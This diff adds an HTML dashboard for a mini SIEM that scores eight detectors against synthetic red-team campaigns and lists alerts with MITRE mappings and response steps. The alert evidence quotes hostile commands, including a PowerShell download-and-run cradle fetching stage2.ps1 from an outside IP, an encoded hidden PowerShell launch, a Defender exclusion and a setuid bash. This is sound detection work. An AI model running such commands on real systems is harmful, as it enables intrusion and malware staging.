@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Signal Deck — Mini SIEM Console</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0e1116; --panel:#141821; --panel-2:#181d28; --line:#262c3a;
+  --ink:#e7ebf3; --ink-dim:#8891a4; --ink-faint:#5b6377;
+  --accent:#5b8cff; --accent-dim:#2c3f6e;
+  --crit:#ff5470; --high:#ff9f43; --med:#e8c547; --low:#4fd1c5;
+  font-family:'IBM Plex Sans',sans-serif;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme:light){
+  :root:not([data-theme="dark"]){
+    --bg:#f4f5f8; --panel:#ffffff; --panel-2:#eef0f5; --line:#dde1ea;
+    --ink:#161a24; --ink-dim:#565f74; --ink-faint:#8891a4;
+    --accent-dim:#dde6ff;
+  }
+}
+*{box-sizing:border-box;}
+html{scroll-padding-top:env(safe-area-inset-top,0px);}
+body{margin:0;background:var(--bg);color:var(--ink);min-height:100%;}
+code,.mono{font-family:'IBM Plex Mono',monospace;}
+
+header{
+  position:sticky;top:0;z-index:5;
+  padding:18px 28px calc(18px);
+  padding-top:calc(18px + env(safe-area-inset-top,0px));
+  background:linear-gradient(180deg,var(--bg) 70%,rgba(14,17,22,0));
+  border-bottom:1px solid var(--line);
+  display:flex;align-items:baseline;justify-content:space-between;flex-wrap:wrap;gap:8px 24px;
+}
+header h1{font-size:20px;margin:0;font-weight:600;letter-spacing:-0.01em;}
+header .sub{color:var(--ink-dim);font-size:13px;font-family:'IBM Plex Mono',monospace;}
+
+main{max-width:1180px;margin:0 auto;padding:24px 28px 64px;}
+
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1px;
+  background:var(--line);border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:28px;}
+.stat{background:var(--panel);padding:16px 18px;}
+.stat .n{font-family:'IBM Plex Mono',monospace;font-size:26px;font-weight:600;line-height:1;}
+.stat .l{color:var(--ink-dim);font-size:12.5px;margin-top:6px;}
+.stat.accent .n{color:var(--accent);}
+.stat.crit .n{color:var(--crit);}
+
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;margin-bottom:24px;}
+.panel h2{font-size:14px;font-weight:600;margin:0;padding:14px 18px;border-bottom:1px solid var(--line);color:var(--ink);}
+.panel h2 span{color:var(--ink-faint);font-weight:400;font-family:'IBM Plex Mono',monospace;font-size:12px;margin-left:8px;}
+
+table.score{width:100%;border-collapse:collapse;font-size:13px;}
+table.score th{text-align:left;color:var(--ink-dim);font-weight:500;padding:8px 18px;font-size:12px;border-bottom:1px solid var(--line);}
+table.score td{padding:8px 18px;border-bottom:1px solid var(--line);font-family:'IBM Plex Mono',monospace;}
+table.score tr:last-child td{border-bottom:none;}
+table.score td.fp{color:var(--crit);}
+table.score td.fp.zero{color:var(--ink-faint);}
+
+.filters{display:flex;gap:8px;padding:12px 18px;border-bottom:1px solid var(--line);flex-wrap:wrap;align-items:center;}
+.filters select, .filters input{
+  background:var(--panel-2);color:var(--ink);border:1px solid var(--line);border-radius:6px;
+  padding:7px 10px;font-family:'IBM Plex Sans',sans-serif;font-size:13px;
+}
+.filters input{flex:1;min-width:160px;}
+.filters .count{color:var(--ink-faint);font-size:12.5px;margin-left:auto;font-family:'IBM Plex Mono',monospace;}
+
+.alert-row{border-bottom:1px solid var(--line);padding:14px 18px;cursor:pointer;display:grid;
+  grid-template-columns:86px 150px 1fr auto;gap:14px;align-items:start;}
+.alert-row:hover{background:var(--panel-2);}
+.alert-row:last-child{border-bottom:none;}
+.sev{font-size:11px;font-weight:600;padding:3px 8px;border-radius:4px;white-space:nowrap;height:fit-content;
+  font-family:'IBM Plex Mono',monospace;letter-spacing:0.02em;}
+.sev.Critical{background:rgba(255,84,112,.15);color:var(--crit);}
+.sev.High{background:rgba(255,159,67,.15);color:var(--high);}
+.sev.Medium{background:rgba(232,197,71,.15);color:var(--med);}
+.sev.Low{background:rgba(79,209,197,.15);color:var(--low);}
+.meta{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--ink-dim);line-height:1.6;}
+.meta b{color:var(--ink);font-weight:500;}
+.body-col .type{font-weight:600;font-size:14px;margin-bottom:3px;}
+.body-col .evidence{color:var(--ink-dim);font-size:13px;line-height:1.5;}
+.mitre{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--accent);white-space:nowrap;
+  background:var(--accent-dim);padding:3px 8px;border-radius:4px;height:fit-content;}
+.detail{display:none;grid-column:1/-1;background:var(--panel-2);border-radius:8px;padding:12px 14px;margin-top:4px;font-size:13px;}
+.detail.open{display:block;}
+.detail .row{margin-bottom:8px;}
+.detail .row:last-child{margin-bottom:0;}
+.detail .k{color:var(--ink-faint);font-size:11.5px;text-transform:uppercase;letter-spacing:.04em;margin-bottom:2px;}
+
+footer{color:var(--ink-faint);font-size:12px;text-align:center;padding:20px;font-family:'IBM Plex Mono',monospace;}
+</style>
+</head>
+<body>
+<header>
+  <h1>Signal Deck</h1>
+  <div class="sub">mini SIEM · Sep 22–24, 2026 · 3 collectors → 8 detectors</div>
+</header>
+<main>
+
+  <div class="stats">
+    <div class="stat accent"><div class="n">29</div><div class="l">alerts fired</div></div>
+    <div class="stat crit"><div class="n">12</div><div class="l">critical</div></div>
+    <div class="stat"><div class="n">16/16</div><div class="l">campaigns detected</div></div>
+    <div class="stat"><div class="n">0.97</div><div class="l">precision (TP/alerts)</div></div>
+    <div class="stat"><div class="n">1.00</div><div class="l">recall (campaigns)</div></div>
+    <div class="stat"><div class="n">0.98</div><div class="l">F1 score</div></div>
+  </div>
+
+  <div class="panel">
+    <h2>Detection scorecard <span>synthetic red-team campaigns vs. detector output</span></h2>
+    <table class="score">
+      <tr><th>Attack type</th><th>Campaigns</th><th>Detected</th><th>Alerts fired</th><th>False positives</th></tr>
+      <tr><td style='font-family:"IBM Plex Sans"'>brute force</td><td>2</td><td>2/2</td><td>5</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>impossible login</td><td>2</td><td>2/2</td><td>2</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>large outbound transfer</td><td>2</td><td>2/2</td><td>2</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>new admin account</td><td>2</td><td>2/2</td><td>2</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>persistence</td><td>2</td><td>2/2</td><td>4</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>port scan</td><td>2</td><td>2/2</td><td>4</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>privilege escalation</td><td>2</td><td>2/2</td><td>3</td><td class='fp zero'>0</td></tr><tr><td style='font-family:"IBM Plex Sans"'>suspicious powershell</td><td>2</td><td>2/2</td><td>6</td><td class='fp'>1</td></tr>
+    </table>
+  </div>
+
+  <div class="panel">
+    <h2>Alerts <span id="alertCount"></span></h2>
+    <div class="filters">
+      <select id="fSev"><option value="">All severities</option></select>
+      <select id="fType"><option value="">All attack types</option></select>
+      <input id="fSearch" placeholder="Search IP, host, evidence…">
+    </div>
+    <div id="alertList"></div>
+  </div>
+
+  <footer>Generated locally from synthetic logs · no real hosts, users, or IPs · click a row for evidence + response</footer>
+</main>
+
+<script>
+const ALERTS = [{"ts": "2026-09-22 02:50:54", "severity": "High", "src_ip": "LINUX-SRV01", "target_host": "LINUX-SRV01", "attack_type": "persistence", "mitre_technique": "T1053.003", "mitre_tactic": "Persistence", "evidence": "Cron job runs a script from a hidden/temp directory: cmd=/tmp/.hidden/backdoor.sh", "recommended_response": "Remove the cron entry, quarantine the referenced script, and check /etc/cron*, /var/spool/cron for other injected jobs.", "detector": "persistence_v1", "confidence": 0.85}, {"ts": "2026-09-22 02:51:39", "severity": "Medium", "src_ip": "LINUX-SRV01", "target_host": "LINUX-SRV01", "attack_type": "persistence", "mitre_technique": "T1098.004", "mitre_tactic": "Persistence", "evidence": "authorized_keys file modified for user 'svc_tmp'", "recommended_response": "Diff the authorized_keys file against the last known-good backup and remove any unrecognized public key.", "detector": "persistence_v1", "confidence": 0.6}, {"ts": "2026-09-22 03:02:18", "severity": "High", "src_ip": "203.0.113.7", "target_host": "WIN-DESKTOP01", "attack_type": "brute_force", "mitre_technique": "T1110", "mitre_tactic": "Credential Access", "evidence": "8 failed logons for user 'administrator' from 203.0.113.7 within 5 min", "recommended_response": "Block source IP at the firewall/edge, force-reset the targeted account's password, and enable account lockout / MFA on the exposed logon service.", "detector": "brute_force_v1", "confidence": 0.85}, {"ts": "2026-09-22 03:04:08", "severity": "Critical", "src_ip": "203.0.113.7", "target_host": "WIN-DESKTOP01", "attack_type": "brute_force", "mitre_technique": "T1110", "mitre_tactic": "Credential Access", "evidence": "8 failed logons for user 'administrator' from 203.0.113.7 within 5 min; followed by a SUCCESSFUL logon at 2026-09-22 03:05:33", "recommended_response": "Block source IP at the firewall/edge, force-reset the targeted account's password, and enable account lockout / MFA on the exposed logon service. Investigate the account for compromise -- the brute force appears to have succeeded.", "detector": "brute_force_v1", "confidence": 0.95}, {"ts": "2026-09-22 03:31:23", "severity": "High", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'jsmith' ran PowerShell flagged for: privilege enumeration command. Command: User=jsmith; ScriptBlock=whoami /priv", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.8}, {"ts": "2026-09-22 03:31:38", "severity": "High", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "privilege_escalation", "mitre_technique": "T1134", "mitre_tactic": "Privilege Escalation", "evidence": "User 'jsmith' enumerated privileges (whoami /priv) then was assigned User=jsmith; Privileges=SeDebugPrivilege within 5 minutes", "recommended_response": "Investigate the process token for manipulation, verify the account's baseline privileges, and check for known token-impersonation tooling on the host.", "detector": "privesc_v1", "confidence": 0.8}, {"ts": "2026-09-22 03:50:31", "severity": "Critical", "src_ip": "LINUX-SRV02", "target_host": "LINUX-SRV02", "attack_type": "new_admin_account", "mitre_technique": "T1136.001", "mitre_tactic": "Persistence", "evidence": "Linux account 'svc_tmp' created then added to the sudo group within a minute -- overnight", "recommended_response": "Disable the account, confirm business justification, and audit sudoers changes on this host.", "detector": "new_admin_v1", "confidence": 0.85}, {"ts": "2026-09-22 04:13:45", "severity": "High", "src_ip": "198.51.100.88", "target_host": "LINUX-SRV01", "attack_type": "brute_force", "mitre_technique": "T1110", "mitre_tactic": "Credential Access", "evidence": "8 failed logons for user 'root' from 198.51.100.88 within 5 min", "recommended_response": "Block source IP at the firewall/edge, force-reset the targeted account's password, and enable account lockout / MFA on the exposed logon service.", "detector": "brute_force_v1", "confidence": 0.85}, {"ts": "2026-09-22 04:14:44", "severity": "High", "src_ip": "198.51.100.88", "target_host": "LINUX-SRV01", "attack_type": "brute_force", "mitre_technique": "T1110", "mitre_tactic": "Credential Access", "evidence": "8 failed logons for user 'root' from 198.51.100.88 within 5 min", "recommended_response": "Block source IP at the firewall/edge, force-reset the targeted account's password, and enable account lockout / MFA on the exposed logon service.", "detector": "brute_force_v1", "confidence": 0.85}, {"ts": "2026-09-22 04:15:36", "severity": "High", "src_ip": "198.51.100.88", "target_host": "LINUX-SRV01", "attack_type": "brute_force", "mitre_technique": "T1110", "mitre_tactic": "Credential Access", "evidence": "8 failed logons for user 'root' from 198.51.100.88 within 5 min", "recommended_response": "Block source IP at the firewall/edge, force-reset the targeted account's password, and enable account lockout / MFA on the exposed logon service.", "detector": "brute_force_v1", "confidence": 0.85}, {"ts": "2026-09-22 04:22:04", "severity": "High", "src_ip": "LINUX-SRV02", "target_host": "LINUX-SRV02", "attack_type": "privilege_escalation", "mitre_technique": "T1548.003", "mitre_tactic": "Privilege Escalation", "evidence": "User 'agarcia' escalated via sudo on LINUX-SRV02: 2026-09-22 04:22:04 as=root; cmd=/bin/bash; 2026-09-22 04:22:24 as=root; cmd=/usr/sbin/visudo", "recommended_response": "Review the account's need for sudo access, audit /etc/sudoers and any SUID bits changed on this host, and rotate credentials for the account used.", "detector": "privesc_v1", "confidence": 0.9}, {"ts": "2026-09-22 04:22:44", "severity": "Critical", "src_ip": "LINUX-SRV02", "target_host": "LINUX-SRV02", "attack_type": "privilege_escalation", "mitre_technique": "T1548.003", "mitre_tactic": "Privilege Escalation", "evidence": "User 'root' escalated via sudo on LINUX-SRV02: 2026-09-22 04:22:44 as=root; cmd=/usr/bin/chmod u+s /bin/bash", "recommended_response": "Review the account's need for sudo access, audit /etc/sudoers and any SUID bits changed on this host, and rotate credentials for the account used.", "detector": "privesc_v1", "confidence": 0.9}, {"ts": "2026-09-22 12:59:53", "severity": "Critical", "src_ip": "198.51.100.23|192.0.2.44", "target_host": "LINUX-SRV02", "attack_type": "impossible_login", "mitre_technique": "T1078", "mitre_tactic": "Defense Evasion / Initial Access", "evidence": "User 'jsmith' logged in from CN-Shanghai at 2026-09-22 12:51:53 then from US-Ashburn at 2026-09-22 12:59:53 (8 min apart -- not physically possible)", "recommended_response": "Force-expire the account's active sessions, require password reset and MFA re-enrollment, and check for mailbox rules or OAuth grants added during the session.", "detector": "impossible_login_v1", "confidence": 0.9}, {"ts": "2026-09-22 16:28:03", "severity": "Critical", "src_ip": "192.0.2.44|198.51.100.88", "target_host": "LINUX-SRV02", "attack_type": "impossible_login", "mitre_technique": "T1078", "mitre_tactic": "Defense Evasion / Initial Access", "evidence": "User 'agarcia' logged in from US-Ashburn at 2026-09-22 16:20:03 then from BR-SaoPaulo at 2026-09-22 16:28:03 (8 min apart -- not physically possible)", "recommended_response": "Force-expire the account's active sessions, require password reset and MFA re-enrollment, and check for mailbox rules or OAuth grants added during the session.", "detector": "impossible_login_v1", "confidence": 0.9}, {"ts": "2026-09-22 22:57:05", "severity": "Critical", "src_ip": "WIN-DESKTOP02", "target_host": "WIN-DESKTOP02", "attack_type": "new_admin_account", "mitre_technique": "T1136.001", "mitre_tactic": "Persistence", "evidence": "Account 'svc_temp42' created by administrator at 2026-09-22 22:56:57 then immediately added to an administrative group (User=administrator; Account=svc_temp42; Group=Administrators) -- outside business hours", "recommended_response": "Disable the new account pending review, confirm who requested it through change management, and audit what that account has accessed since creation.", "detector": "new_admin_v1", "confidence": 0.9}, {"ts": "2026-09-23 02:09:37", "severity": "High", "src_ip": "198.51.100.23", "target_host": "10.0.0.15", "attack_type": "port_scan", "mitre_technique": "T1046", "mitre_tactic": "Discovery", "evidence": "15 distinct destination ports contacted on 10.0.0.15 from 198.51.100.23 within 2 minutes (100% denied)", "recommended_response": "Block the source IP at the perimeter firewall, review IDS signatures for the scanned host, and confirm no listening service was reachable that shouldn't be.", "detector": "port_scan_v1", "confidence": 0.9}, {"ts": "2026-09-23 02:09:56", "severity": "High", "src_ip": "198.51.100.23", "target_host": "10.0.0.15", "attack_type": "port_scan", "mitre_technique": "T1046", "mitre_tactic": "Discovery", "evidence": "15 distinct destination ports contacted on 10.0.0.15 from 198.51.100.23 within 2 minutes (100% denied)", "recommended_response": "Block the source IP at the perimeter firewall, review IDS signatures for the scanned host, and confirm no listening service was reachable that shouldn't be.", "detector": "port_scan_v1", "confidence": 0.9}, {"ts": "2026-09-23 04:39:27", "severity": "High", "src_ip": "WIN-DESKTOP02", "target_host": "WIN-DESKTOP02", "attack_type": "persistence", "mitre_technique": "T1053.005", "mitre_tactic": "Persistence", "evidence": "Scheduled task '?' launches a binary from a user-writable path: User=svc_temp42; TaskName=SystemHealthCheck; Command=C:\\Users\\Public\\upd.exe", "recommended_response": "Delete the scheduled task, quarantine the referenced binary for analysis, and check Task Scheduler history for who created it.", "detector": "persistence_v1", "confidence": 0.85}, {"ts": "2026-09-23 04:39:57", "severity": "High", "src_ip": "WIN-DESKTOP02", "target_host": "WIN-DESKTOP02", "attack_type": "persistence", "mitre_technique": "T1543.003", "mitre_tactic": "Persistence", "evidence": "New Windows service installed pointing at a non-standard path: User=svc_temp42; ServiceName=WinHelperSvc; BinaryPath=C:\\ProgramData\\svc.exe", "recommended_response": "Stop and delete the service, quarantine the binary, and review recent local admin logons on this host.", "detector": "persistence_v1", "confidence": 0.85}, {"ts": "2026-09-23 18:17:20", "severity": "Critical", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: base64-encoded (-enc) command, hidden window, no-profile launch flags. Command: User=mchen; ScriptBlock=powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.95}, {"ts": "2026-09-23 18:17:43", "severity": "Critical", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: IEX (Invoke-Expression) download-and-run cradle, remote script/file download cradle. Command: User=mchen; ScriptBlock=IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.95}, {"ts": "2026-09-23 18:18:01", "severity": "High", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: Defender exclusion path added via script. Command: User=mchen; ScriptBlock=Add-MpPreference -ExclusionPath 'C:\\Users\\Public'", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.8}, {"ts": "2026-09-23 19:32:01", "severity": "Critical", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: base64-encoded (-enc) command, hidden window, no-profile launch flags. Command: User=mchen; ScriptBlock=powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.95}, {"ts": "2026-09-23 19:32:33", "severity": "Critical", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: IEX (Invoke-Expression) download-and-run cradle, remote script/file download cradle. Command: User=mchen; ScriptBlock=IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.95}, {"ts": "2026-09-23 19:32:45", "severity": "High", "src_ip": "WIN-DESKTOP01", "target_host": "WIN-DESKTOP01", "attack_type": "suspicious_powershell", "mitre_technique": "T1059.001", "mitre_tactic": "Execution", "evidence": "User 'mchen' ran PowerShell flagged for: Defender exclusion path added via script. Command: User=mchen; ScriptBlock=Add-MpPreference -ExclusionPath 'C:\\Users\\Public'", "recommended_response": "Isolate the host from the network, capture a memory image, terminate the process, and review PowerShell ScriptBlock logs on this host for the preceding 24h.", "detector": "powershell_v1", "confidence": 0.8}, {"ts": "2026-09-24 04:33:24", "severity": "High", "src_ip": "198.51.100.88", "target_host": "10.0.0.15", "attack_type": "port_scan", "mitre_technique": "T1046", "mitre_tactic": "Discovery", "evidence": "15 distinct destination ports contacted on 10.0.0.15 from 198.51.100.88 within 2 minutes (100% denied)", "recommended_response": "Block the source IP at the perimeter firewall, review IDS signatures for the scanned host, and confirm no listening service was reachable that shouldn't be.", "detector": "port_scan_v1", "confidence": 0.9}, {"ts": "2026-09-24 04:33:47", "severity": "High", "src_ip": "198.51.100.88", "target_host": "10.0.0.15", "attack_type": "port_scan", "mitre_technique": "T1046", "mitre_tactic": "Discovery", "evidence": "15 distinct destination ports contacted on 10.0.0.15 from 198.51.100.88 within 2 minutes (100% denied)", "recommended_response": "Block the source IP at the perimeter firewall, review IDS signatures for the scanned host, and confirm no listening service was reachable that shouldn't be.", "detector": "port_scan_v1", "confidence": 0.9}, {"ts": "2026-09-24 22:34:44", "severity": "Critical", "src_ip": "10.0.0.16", "target_host": "10.0.0.16", "attack_type": "large_outbound_transfer", "mitre_technique": "T1048", "mitre_tactic": "Exfiltration", "evidence": "1249 MB transferred from 10.0.0.16 to external host 203.0.113.7 on port 443 (baseline p95 for this network is 0 MB) -- outside business hours", "recommended_response": "Block the destination IP, capture a packet trace if the session is still open, and identify what data set on the source host could produce a transfer this size.", "detector": "exfil_v1", "confidence": 0.85}, {"ts": "2026-09-24 22:36:28", "severity": "Critical", "src_ip": "10.0.0.16", "target_host": "10.0.0.16", "attack_type": "large_outbound_transfer", "mitre_technique": "T1048", "mitre_tactic": "Exfiltration", "evidence": "658 MB transferred from 10.0.0.16 to external host 198.51.100.23 on port 443 (baseline p95 for this network is 0 MB) -- outside business hours", "recommended_response": "Block the destination IP, capture a packet trace if the session is still open, and identify what data set on the source host could produce a transfer this size.", "detector": "exfil_v1", "confidence": 0.85}];
+const SEV_ORDER = {Critical:0, High:1, Medium:2, Low:3};
+
+function el(tag, cls, html){ const e=document.createElement(tag); if(cls) e.className=cls; if(html!=null) e.innerHTML=html; return e; }
+
+function populateFilters(){
+  const sevs = [...new Set(ALERTS.map(a=>a.severity))].sort((a,b)=>SEV_ORDER[a]-SEV_ORDER[b]);
+  const types = [...new Set(ALERTS.map(a=>a.attack_type))].sort();
+  const fSev = document.getElementById('fSev'), fType = document.getElementById('fType');
+  sevs.forEach(s=>fSev.appendChild(el('option','',s)).value=s);
+  types.forEach(t=>fType.appendChild(el('option','',t.replace(/_/g,' '))).value=t);
+}
+
+function render(){
+  const sev = document.getElementById('fSev').value;
+  const type = document.getElementById('fType').value;
+  const q = document.getElementById('fSearch').value.toLowerCase();
+  const list = document.getElementById('alertList');
+  list.innerHTML = '';
+  const filtered = ALERTS.filter(a=>{
+    if(sev && a.severity!==sev) return false;
+    if(type && a.attack_type!==type) return false;
+    if(q && !(a.evidence+a.src_ip+a.target_host).toLowerCase().includes(q)) return false;
+    return true;
+  }).sort((a,b)=> SEV_ORDER[a.severity]-SEV_ORDER[b.severity] || (a.ts<b.ts?1:-1));
+  document.getElementById('alertCount').textContent = `${filtered.length} of ${ALERTS.length}`;
+
+  filtered.forEach(a=>{
+    const row = el('div','alert-row');
+    row.appendChild(el('div', 'sev '+a.severity, a.severity));
+    row.appendChild(el('div','meta', `${a.ts.replace(' ','<br>')}`));
+    row.appendChild(el('div','body-col', `<div class="type">${a.attack_type.replace(/_/g,' ')}</div><div class="evidence">${a.src_ip} → ${a.target_host}</div>`));
+    row.appendChild(el('div','mitre', a.mitre_technique));
+    const detail = el('div','detail', `
+      <div class="row"><div class="k">Evidence</div>${a.evidence}</div>
+      <div class="row"><div class="k">MITRE ATT&amp;CK</div>${a.mitre_technique} — ${a.mitre_tactic}</div>
+      <div class="row"><div class="k">Recommended response</div>${a.recommended_response}</div>
+      <div class="row"><div class="k">Detector / confidence</div>${a.detector} · ${(a.confidence*100).toFixed(0)}%</div>
+    `);
+    row.addEventListener('click', ()=> detail.classList.toggle('open'));
+    const wrap = el('div');
+    wrap.appendChild(row);
+    wrap.appendChild(detail);
+    list.appendChild(wrap);
+  });
+}
+
+populateFilters();
+render();
+['fSev','fType'].forEach(id=>document.getElementById(id).addEventListener('change', render));
+document.getElementById('fSearch').addEventListener('input', render);
+</script>
+</body>
+</html>
